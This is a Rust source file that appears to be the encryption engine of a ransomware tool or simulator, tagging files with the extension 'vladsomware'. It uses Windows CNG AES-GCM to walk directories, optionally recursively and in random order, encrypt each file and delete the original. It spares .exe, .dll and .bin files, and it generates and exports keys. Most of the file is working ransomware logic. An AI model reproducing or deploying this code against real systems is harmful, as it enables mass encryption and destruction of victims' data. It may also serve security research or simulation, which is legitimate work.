use crate::directory_enumerator::{enumerate_dir_entries, name_from_find_data, FindData};
use crate::progress::Progress;
use spdlog::{debug, error, info, warn};
use std::cmp::PartialEq;
use std::collections::{HashSet, LinkedList};
use std::ffi::{c_void, OsStr, OsString};
use std::fs;
use std::fs::File;
use std::io::{BufReader, BufWriter, Read, Write};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Condvar, Mutex};
use std::thread::{self, JoinHandle};
use windows::{
    core::*, Win32::Security::Cryptography::*, Win32::Storage::FileSystem::FILE_ATTRIBUTE_DIRECTORY,
};

#[derive(PartialEq)]
pub(crate) enum EncryptionMode {
    Encrypt,
    Decrypt,
}

const CHUNK_SIZE: usize = 4096;
const TAG_LEN: usize = 16;

#[inline]
fn make_gcm_info<'a>(
    nonce: &'a [u8],       // 12 bytes
    tag_buf: &'a mut [u8], // output on encrypt, input on decrypt
    aad: Option<&'a [u8]>, // keep None unless you bind a header
) -> BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
    let mut info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO::default();
    info.cbSize = std::mem::size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as u32;
    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    info.pbNonce = nonce.as_ptr() as *mut u8;
    info.cbNonce = nonce.len() as u32;
    info.pbTag = tag_buf.as_mut_ptr();
    info.cbTag = tag_buf.len() as u32;
    if let Some(a) = aad {
        info.pbAuthData = a.as_ptr() as *mut u8;
        info.cbAuthData = a.len() as u32;
    }
    info
}

#[inline]
fn nonce_from(base: [u8; 12], counter: u64) -> [u8; 12] {
    let mut n = base;
    n[4..12].copy_from_slice(&counter.to_le_bytes());
    n
}

struct InnerEncryptor {
    aes_handle: Owned<BCRYPT_ALG_HANDLE>,
    key_handle: Owned<BCRYPT_KEY_HANDLE>,
    key: Vec<u8>,
    key_object: Vec<u8>,
    key_file_name: OsString,
    encryption_extension: OsString,
    encryption_mode: EncryptionMode,
    recursive: bool,
    random_order: bool,
    whitelisted_extensions: Vec<OsString>,
}

impl InnerEncryptor {
    fn new() -> eframe::Result<Self, Error> {
        Ok(Self {
            aes_handle: Owned::default(),
            key_handle: Owned::default(),
            key: Vec::default(),
            key_object: Vec::default(),
            key_file_name: OsString::default(),
            encryption_extension: OsString::from("vladsomware"),
            encryption_mode: EncryptionMode::Encrypt,
            recursive: false,
            random_order: false,
            whitelisted_extensions: vec![
                OsString::from("exe"),
                OsString::from("dll"),
                OsString::from("bin"),
            ],
        })
    }

    fn export_key_data_blob(&mut self) -> Result<Vec<u8>> {
        unsafe {
            let mut cb = 0u32;
            BCryptExportKey(
                *self.key_handle,
                None,
                PCWSTR(BCRYPT_KEY_DATA_BLOB.as_ptr()),
                None,
                &mut cb,
                0,
            )
            .ok()?;

            let mut blob = vec![0u8; cb as usize];
            BCryptExportKey(
                *self.key_handle,
                None,
                PCWSTR(BCRYPT_KEY_DATA_BLOB.as_ptr()),
                Some(&mut blob),
                &mut cb,
                0,
            )
            .ok()?;

            Ok(blob)
        }
    }

    fn import_key_data_blob(&mut self, blob: &[u8]) -> Result<()> {
        unsafe {
            let mut object_len = [0u8; 4];
            let mut bytes_copied = 0;
            BCryptGetProperty(
                (*self.aes_handle).into(),
                BCRYPT_OBJECT_LENGTH,
                Some(&mut object_len),
                &mut bytes_copied,
                0,
            )
            .ok()?;
            let object_len = u32::from_le_bytes(object_len) as usize;
            self.key_object = vec![0u8; object_len];

            BCryptImportKey(
                (*self.aes_handle).into(),
                None,
                PCWSTR(BCRYPT_KEY_DATA_BLOB.as_ptr()),
                &mut *self.key_handle,
                Some(&mut self.key_object),
                &blob,
                0,
            )
            .ok()?;
            Ok(())
        }
    }

    fn set_gcm_chaining_mode(&mut self, handle: BCRYPT_HANDLE) -> Result<()> {
        unsafe {
            BCryptSetProperty(
                handle,
                BCRYPT_CHAINING_MODE,
                BCRYPT_CHAIN_MODE_GCM.as_wide().align_to::<u8>().1,
                0,
            )
            .ok()
        }
    }

    fn open_aes_gcm(&mut self) -> Result<Owned<BCRYPT_ALG_HANDLE>> {
        let mut aes = Owned::default();
        unsafe {
            BCryptOpenAlgorithmProvider(&mut *aes, BCRYPT_AES_ALGORITHM, None, Default::default())
                .ok()?;

            self.set_gcm_chaining_mode((*aes).into())?;
        }
        Ok(aes)
    }

    fn load_key(&mut self, key_path: &PathBuf) -> Result<()> {
        let blob = std::fs::read(key_path)?;
        self.aes_handle = self.open_aes_gcm()?;

        self.import_key_data_blob(&blob)?;
        self.key = blob;
        self.key_file_name = OsString::from(key_path.file_name().unwrap());
        Ok(())
    }

    fn gen_key(&mut self, key_file_name: String) -> Result<()> {
        unsafe {
            let mut rng = Owned::default();
            BCryptOpenAlgorithmProvider(&mut *rng, BCRYPT_RNG_ALGORITHM, None, Default::default())
                .ok()?;

            self.aes_handle = self.open_aes_gcm()?;

            let mut object_len = [0u8; 4];
            let mut bytes_copied = 0;
            BCryptGetProperty(
                (*self.aes_handle).into(),
                BCRYPT_OBJECT_LENGTH,
                Some(&mut object_len),
                &mut bytes_copied,
                0,
            )
            .ok()?;
            let object_len = u32::from_le_bytes(object_len) as usize;
            self.key_object = vec![0u8; object_len];
            let mut key_material = vec![0u8; 32];
            BCryptGenRandom((*rng).into(), &mut key_material, Default::default()).ok()?;

            BCryptGenerateSymmetricKey(
                *self.aes_handle,
                &mut *self.key_handle,
                Some(&mut self.key_object),
                key_material.as_mut_slice(),
                0,
            )
            .ok()?;
            self.set_gcm_chaining_mode((*self.key_handle).into())?;
            self.key = self.export_key_data_blob()?;
            debug!("generated key: {:?}", self.key);
            self.key_file_name = OsString::from(key_file_name);

            Ok(())
        }
    }

    fn is_directory(&self, fd: &FindData) -> bool {
        fd.0.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY.0 != 0
    }

    fn eq_ignore_ascii_case_os(a: &OsStr, b: &OsStr) -> bool {
        a.to_string_lossy()
            .eq_ignore_ascii_case(&b.to_string_lossy())
    }

    fn should_skip_dir_entry(&self, fd: &FindData) -> bool {
        let file_name = name_from_find_data(fd); // OsString
        if file_name == OsStr::new(".") || file_name == OsStr::new("..") {
            return true;
        }

        if self.is_directory(&fd) {
            return false;
        }

        let ext = Path::new(&file_name).extension(); // Option<&OsStr>
        for ext_to_whitelist in self.whitelisted_extensions.iter() {
            if Self::eq_ignore_ascii_case_os(ext_to_whitelist, ext.unwrap()) {
                return true;
            }
        }
        let matches = ext == Some(self.encryption_extension.as_os_str());

        match self.encryption_mode {
            EncryptionMode::Encrypt => matches, // skip files already encrypted
            EncryptionMode::Decrypt => !matches, // skip files not having the tag (including None)
        }
    }

    fn gen_nonce12(&self) -> [u8; 12] {
        let mut n = [0u8; 12];
        unsafe {
            BCryptGenRandom(None, &mut n, BCRYPT_USE_SYSTEM_PREFERRED_RNG)
                .ok()
                .unwrap();
        }
        n
    }

    fn encrypt_chunk_gcm(
        &self,
        plaintext: &[u8],
        nonce12: &[u8],
    ) -> Result<(Vec<u8>, [u8; TAG_LEN])> {
        unsafe {
            let mut tag = [0u8; TAG_LEN];
            let info = make_gcm_info(nonce12, &mut tag[..], None);

            // size query
            let mut out_len = 0u32;
            BCryptEncrypt(
                (*self.key_handle).into(),
                Some(plaintext),
                Some(core::ptr::from_ref(&info).cast::<c_void>()),
                None,
                None,
                &mut out_len,
                BCRYPT_FLAGS(0),
            )
            .ok()?;

            // real call
            let mut ct = vec![0u8; out_len as usize];
            let mut written = 0u32;
            BCryptEncrypt(
                (*self.key_handle).into(),
                Some(plaintext),
                Some(core::ptr::from_ref(&info).cast::<c_void>()),
                None,
                Some(&mut ct),
                &mut written,
                BCRYPT_FLAGS(0),
            )
            .ok()?;
            ct.truncate(written as usize);
            Ok((ct, tag))
        }
    }

    fn decrypt_chunk_gcm(
        &self,
        ciphertext: &[u8],
        nonce12: &[u8],
        tag: &[u8; TAG_LEN],
    ) -> Result<Vec<u8>> {
        unsafe {
            let mut tag_buf = *tag; // input on decrypt
            let info = make_gcm_info(nonce12, &mut tag_buf[..], None);

            // size query
            let mut out_len = 0u32;
            BCryptDecrypt(
                (*self.key_handle).into(),
                Some(ciphertext),
                Some(core::ptr::from_ref(&info).cast::<c_void>()),
                None,
                None,
                &mut out_len,
                BCRYPT_FLAGS(0),
            )
            .ok()?;

            // real call
            let mut pt = vec![0u8; out_len as usize];
            let mut written = 0u32;
            BCryptDecrypt(
                (*self.key_handle).into(),
                Some(ciphertext),
                Some(core::ptr::from_ref(&info).cast::<c_void>()),
                None,
                Some(&mut pt),
                &mut written,
                BCRYPT_FLAGS(0),
            )
            .ok()?;
            pt.truncate(written as usize);
            Ok(pt)
        }
    }

    // ---------- File ops (no file_size, no n, no nonce_suffix) ----------

    pub fn do_encrypt(
        &mut self,
        in_path: &Path,
        out_path: &Path,
        progress: &Progress,
    ) -> Result<()> {
        let in_file = File::open(in_path)?;
        let out_file = File::create(out_path)?;
        let mut r = BufReader::new(&in_file);
        let mut w = BufWriter::new(&out_file);

        // header
        let file_size = in_file.metadata()?.len();
        if file_size == 0 {
            debug!("file {} is empty, nothing to encrypt", in_path.display());
            return Ok(());
        }
        w.write_all(&file_size.to_le_bytes())?;

        let base = self.gen_nonce12();
        w.write_all(&base)?; // 12 bytes

        // body
        let mut remaining = file_size;
        let mut counter: u64 = 0;
        let mut buf = vec![0u8; CHUNK_SIZE];

        while remaining > 0 {
            let want = std::cmp::min(remaining as usize, buf.len());
            r.read_exact(&mut buf[..want])?;

            let nonce = nonce_from(base, counter);
            let (ct, tag) = self.encrypt_chunk_gcm(&buf[..want], &nonce)?;

            w.write_all(&tag)?; // 16
            w.write_all(&ct)?; // want

            counter = counter.wrapping_add(1);
            remaining -= want as u64;
            progress.add_done(want as u64);
        }
        debug!(
            "encrypted {} to {} in {} chunks",
            in_path.display(),
            out_path.display(),
            counter
        );
        w.flush()?;
        Ok(())
    }

    pub fn do_decrypt(
        &mut self,
        in_path: &Path,
        out_path: &Path,
        progress: &Progress,
    ) -> Result<()> {
        let in_file = File::open(in_path)?;
        let out_file = File::create(out_path)?;
        let mut r = BufReader::new(&in_file);
        let mut w = BufWriter::new(&out_file);

        // header
        let mut sz = [0u8; 8];
        r.read_exact(&mut sz)?;
        let mut remaining = u64::from_le_bytes(sz);

        let mut base = [0u8; 12];
        r.read_exact(&mut base)?;

        // body
        let mut counter: u64 = 0;
        let mut ct_buf = vec![0u8; CHUNK_SIZE];

        while remaining > 0 {
            let want = std::cmp::min(remaining as usize, ct_buf.len());

            // tag
            let mut tag = [0u8; TAG_LEN];
            r.read_exact(&mut tag)?;

            // ciphertext
            r.read_exact(&mut ct_buf[..want])?;

            let nonce = nonce_from(base, counter);
            let pt = self.decrypt_chunk_gcm(&ct_buf[..want], &nonce, &tag)?;
            debug_assert_eq!(pt.len(), want);

            w.write_all(&pt)?;
            counter = counter.wrapping_add(1);
            remaining -= want as u64;
            progress.add_done(want as u64);
        }
        debug!(
            "decrypted {} to {} in {} chunks",
            in_path.display(),
            out_path.display(),
            counter
        );
        w.flush()?;
        Ok(())
    }

    fn encrypt_file(&mut self, path: &Path, progress: &Progress) -> Result<()> {
        let mut encrypted_file_path = path.to_owned();
        encrypted_file_path.add_extension(&self.encryption_extension);
        self.do_encrypt(path, &encrypted_file_path, &progress)?;
        fs::remove_file(path)?;
        Ok(())
    }

    fn decrypt_file(&mut self, path: &Path, progress: &Progress) -> Result<()> {
        let mut decrypted_file_path = path.to_owned();
        decrypted_file_path.set_extension("");
        self.do_decrypt(path, &decrypted_file_path, &progress)?;
        fs::remove_file(path)?;
        Ok(())
    }

    fn act_on_dir_entry(&mut self, dir: &Path, fd: &FindData, depth: i32, progress: &Progress) {
        debug!("processing {}", dir.display());
        if self.should_skip_dir_entry(&fd) {
            return;
        }
        let mut fp = dir.to_owned();
        fp.push(name_from_find_data(fd));
        if self.recursive && self.is_directory(&fd) {
            self.act_on_dir(&fp, depth + 1, &progress);
        } else {
            match self.encryption_mode {
                EncryptionMode::Encrypt => {
                    debug!("encrypting {}", fp.display());
                    self.encrypt_file(&fp, &progress).unwrap_or_else(|e| {
                        error!("Failed to encrypt file {}, Error: {:?}", fp.display(), e);
                    });
                }
                EncryptionMode::Decrypt => {
                    debug!("decrypting {}", fp.display());
                    self.decrypt_file(&fp, &progress).unwrap_or_else(|e| {
                        error!("Failed to decrypt file {}, Error: {:?}", fp.display(), e);
                    })
                }
            }
        }
    }

    fn act_on_dir(&mut self, dir: &Path, depth: i32, progress: &Progress) {
        if depth > 15 {
            error!("too deep: {}", dir.display());
        }
        let mut search_pattern = dir.to_owned();
        search_pattern.push("*");
        if !self.random_order {
            let _result = enumerate_dir_entries(search_pattern, |fd| {
                self.act_on_dir_entry(dir, fd, depth, progress)
            })
            .map_err(|e| {
                error!("Error enumerating directory entries: {}", e);
            });
        } else {
            let mut found_data_set: HashSet<FindData> = HashSet::new();
            let _result = enumerate_dir_entries(search_pattern, |fd| {
                found_data_set.insert(fd.clone());
            }).map_err(|e| {
                error!("Error enumerating directory entries: {}", e);
            });
            if _result.is_ok() {
                for fd in found_data_set {
                    self.act_on_dir_entry(dir, &fd, depth, progress);
                }
            }
        }
    }
    fn compute_entry_size(&mut self, dir: &Path, fd: &FindData, depth: i32) -> u64 {
        if self.should_skip_dir_entry(&fd) {
            return 0;
        }
        let mut fp = dir.to_owned();
        fp.push(name_from_find_data(&fd));
        if ((fd.0.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY.0) != 0) && self.recursive {
            self.compute_dir_size(&fp, depth + 1)
        } else {
            ((fd.0.nFileSizeHigh as u64) << 32) | (fd.0.nFileSizeLow as u64)
        }
    }
    fn compute_dir_size(&mut self, dir: &Path, depth: i32) -> u64 {
        let mut search_pattern = dir.to_owned();
        search_pattern.push("*");
        let mut total_bytes: u64 = 0;
        let mut num_files = 0;
        let result = enumerate_dir_entries(search_pattern, |fd| {
            total_bytes += self.compute_entry_size(dir, fd, depth);
            num_files += 1;
        });
        if result.is_ok() {
            debug!("found {} files", num_files);
            total_bytes
        } else {
            error!(
                "Error enumerating directory entries: {}",
                result.err().unwrap()
            );
            0
        }
    }

    fn encrypt_dir(&mut self, dir_path: &Path, progress: &Progress) {
        debug!("Encrypting directory {}", dir_path.display());
        self.encryption_mode = EncryptionMode::Encrypt;
        let total_size_bytes = self.compute_dir_size(dir_path, 0);
        info!(
            "Encrypting \"{}\", total size : {}MB",
            dir_path.display(),
            total_size_bytes as f64 / 1000000.0
        );
        progress.set_total(total_size_bytes);
        if total_size_bytes == 0 {
            warn!("{} nothing to encrypt", dir_path.display());
            progress.mark_finished();
            return;
        }
        self.act_on_dir(dir_path, 0, &progress);
        info!("Encrypted \"{}\"", dir_path.display());
        progress.mark_finished();
    }

    fn decrypt_dir(&mut self, dir_path: &Path, progress: &Progress) {
        debug!("Decrypting \"{}\"", dir_path.display());
        self.encryption_mode = EncryptionMode::Decrypt;
        let total_size_bytes = self.compute_dir_size(dir_path, 0);
        info!(
            "Decrypting \"{}\", total size: {}MB",
            dir_path.display(),
            total_size_bytes as f64 / 1000000.0
        );
        progress.set_total(total_size_bytes);
        if total_size_bytes == 0 {
            warn!("nothing to decrypt");
            progress.mark_finished();
            return;
        }
        self.act_on_dir(dir_path, 0, &progress);
        info!("Decrypted \"{}\"", dir_path.display());
        progress.mark_finished();
    }
}

type EncryptorTask = Box<dyn FnOnce(&mut InnerEncryptor) + Send + 'static>;

struct TaskQueue {
    list: LinkedList<EncryptorTask>,
    should_stop: bool,
}

pub(crate) struct Encryptor {
    task_queue: Arc<(Mutex<TaskQueue>, Condvar)>,
    _worker: Option<JoinHandle<()>>,
}

impl Encryptor {
    pub(crate) fn new() -> eframe::Result<Self, Error> {
        let task_queue = Arc::new((
            Mutex::new(TaskQueue {
                list: LinkedList::<EncryptorTask>::new(),
                should_stop: false,
            }),
            Condvar::new(),
        ));
        let task_queue_clone = task_queue.clone();

        let worker = thread::spawn(move || {
            let mut enc = InnerEncryptor::new().expect("Failed to create encryptor");
            let (lock, cv) = &*task_queue_clone;
            loop {
                let mut guard = lock.lock().unwrap();
                while !guard.should_stop && guard.list.is_empty() {
                    guard = cv.wait(guard).unwrap();
                }
                if guard.should_stop {
                    break;
                }
                let mut local_queue = LinkedList::new();
                std::mem::swap(&mut local_queue, &mut guard.list);
                drop(guard);

                while let Some(task) = local_queue.pop_front() {
                    task(&mut enc);
                }
            }
        });

        Ok(Self {
            task_queue,
            _worker: Some(worker),
        })
    }

    fn post<F>(&self, f: F)
    where
        F: FnOnce(&mut InnerEncryptor) + Send + 'static,
    {
        let (lock, cv) = &*self.task_queue;
        {
            let mut q = lock.lock().unwrap();
            q.list.push_back(Box::new(f));
        }
        cv.notify_one();
    }

    fn call<R, F>(&self, f: F) -> R
    where
        R: Send + 'static,
        F: FnOnce(&mut InnerEncryptor) -> R + Send + 'static,
    {
        let (tx, rx) = std::sync::mpsc::sync_channel::<R>(0);
        self.post(move |enc| {
            let r = f(enc);
            let _ = tx.send(r);
        });
        rx.recv().unwrap()
    }

    pub(crate) fn load_key(&mut self, key_path: &PathBuf) -> Result<()> {
        let path = key_path.to_owned();
        self.call(move |enc| enc.load_key(&path))
    }

    pub(crate) fn gen_key(&mut self, key_file_name: String) -> Result<()> {
        self.call(|enc| enc.gen_key(key_file_name))
    }

    pub(crate) fn get_key_blob(&mut self) -> Result<Vec<u8>> {
        Ok(self.call(|enc| enc.key.clone()))
    }

    pub(crate) fn set_recursive(&mut self, recursive: bool) {
        self.post(move |enc| enc.recursive = recursive.clone())
    }

    pub(crate) fn set_random_order(&mut self, random_order: bool) {
        self.post(move |enc| enc.random_order = random_order.clone())
    }

    pub(crate) fn encrypt_dir(&mut self, dir_path: &PathBuf) -> Arc<Progress> {
        let path = dir_path.to_owned();
        let progress = Progress::new();
        let worker_progress = Arc::clone(&progress);
        self.post(move |enc| enc.encrypt_dir(&path, &worker_progress));
        progress
    }

    pub(crate) fn decrypt_dir(&mut self, dir_path: &PathBuf) -> Arc<Progress> {
        let path = dir_path.to_owned();
        let progress = Progress::new();
        let worker_progress = Arc::clone(&progress);
        self.post(move |enc| enc.decrypt_dir(&path, &worker_progress));
        progress
    }
}
